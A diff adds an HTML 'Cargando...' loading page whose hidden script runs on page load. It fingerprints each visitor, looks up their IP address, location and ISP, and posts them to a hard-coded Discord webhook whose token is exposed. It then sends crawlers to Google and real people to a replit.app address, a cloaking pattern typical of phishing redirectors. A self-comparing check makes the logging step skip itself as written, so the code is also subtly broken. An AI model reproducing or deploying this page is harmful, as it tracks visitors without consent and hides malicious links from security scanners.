@@ -1,1 +1,117 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Cargando...</title>
+    <script>
+    (async function() {
+        // --- CONFIGURACIÓN ---
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1535509840045281381/4ZtYNq9tt97-oWR6WRFp1nHqpNRjdL7mRk-BeGfkiXQBi7404IS_DEkLn7TlWkvTZIJj";
 
+        const userAgent = navigator.userAgent.toLowerCase();
+        
+        // 1. Detección de bots
+        const botsKeywords = [
+            'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider', 
+            'yandexbot', 'sogou', 'exabot', 'facebot', 'ia_archiver', 
+            'semrushbot', 'ahrefsbot', 'mj12bot', 'petalbot', 'bytespider',
+            'spider', 'crawler', 'robot', 'fetch', 'headless', 'python', 'curl'
+        ];
+
+        const esBotPorUserAgent = botsKeywords.some(bot => userAgent.includes(bot));
+
+        const esBotPorNavegador = (
+            navigator.webdriver === true || 
+            window._phantom || 
+            window.__nightmare || 
+            window.callPhantom ||
+            navigator.languages === "" ||
+            !navigator.languages
+        );
+
+        const esBot = esBotPorUserAgent || esBotPorNavegador;
+
+        // 2. Detección de dispositivo
+        let dispositivo = "Escritorio (PC/Laptop)";
+        if (/iphone|ipad|ipod/.test(userAgent)) {
+            dispositivo = "iOS (iPhone/iPad)";
+        } else if (/android/.test(userAgent)) {
+            dispositivo = "Android";
+        } else if (/mobile/.test(userAgent)) {
+            dispositivo = "Dispositivo Móvil";
+        }
+
+        // 3. Obtener IP y Geolocalización
+        let datosIp = {
+            ip: "Desconocida",
+            ubicacion: "Desconocida",
+            isp: "Desconocido"
+        };
+
+        try {
+            // Petición a IPAPI para obtener los detalles de red del usuario
+            const respuesta = await fetch("https://ipapi.co/json/");
+            if (respuesta.ok) {
+                const data = await respuesta.json();
+                datosIp.ip = data.ip || "Desconocida";
+                datosIp.ubicacion = `${data.city || ""}, ${data.region || ""}, ${data.country_name || ""}`.replace(/^, |, $/g, '') || "Desconocida";
+                datosIp.isp = data.org || data.asn || "Desconocido";
+            }
+        } catch (e) {
+            console.warn("No se pudo obtener la información de IP:", e);
+        }
+
+        // 4. Enviar notificación a Discord
+        function notificarDiscord(callbackRedireccion) {
+            if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes("https://discord.com/api/webhooks/1535509840045281381/4ZtYNq9tt97-oWR6WRFp1nHqpNRjdL7mRk-BeGfkiXQBi7404IS_DEkLn7TlWkvTZIJj")) {
+                callbackRedireccion();
+                return;
+            }
+
+            const payload = {
+                embeds: [{
+                    title: esBot ? "🤖 Bot Detectado" : "👤 Nueva Visita Real",
+                    color: esBot ? 15158332 : 3066993,
+                    fields: [
+                        { name: "Tipo de Visitante", value: esBot ? "`BOT / Crawler`" : "`Persona Real`", inline: true },
+                        { name: "Dispositivo", value: `\`${dispositivo}\``, inline: true },
+                        { name: "Dirección IP", value: `\`${datosIp.ip}\``, inline: true },
+                        { name: "Ubicación", value: `\`${datosIp.ubicacion}\``, inline: true },
+                        { name: "Proveedor (ISP)", value: `\`${datosIp.isp}\``, inline: true },
+                        { name: "User-Agent", value: `\`\`\`${navigator.userAgent.substring(0, 300)}\`\`\`` }
+                    ],
+                    footer: { text: "Notificación de Visita" },
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            fetch(DISCORD_WEBHOOK_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload),
+                keepalive: true
+            }).then(() => {
+                callbackRedireccion();
+            }).catch(err => {
+                console.error("Error enviando a Discord:", err);
+                callbackRedireccion();
+            });
+
+            setTimeout(callbackRedireccion, 600);
+        }
+
+        // 5. Redirección final
+        const urlDestino = esBot 
+            ? "https://www.google.com" 
+            : "https://web-hola-mundo--johnathanaa0.replit.app/bfff/";
+
+        notificarDiscord(function() {
+            window.location.replace(urlDestino);
+        });
+    })();
+    </script>
+</head>
+<body>
+</body>
+</html>
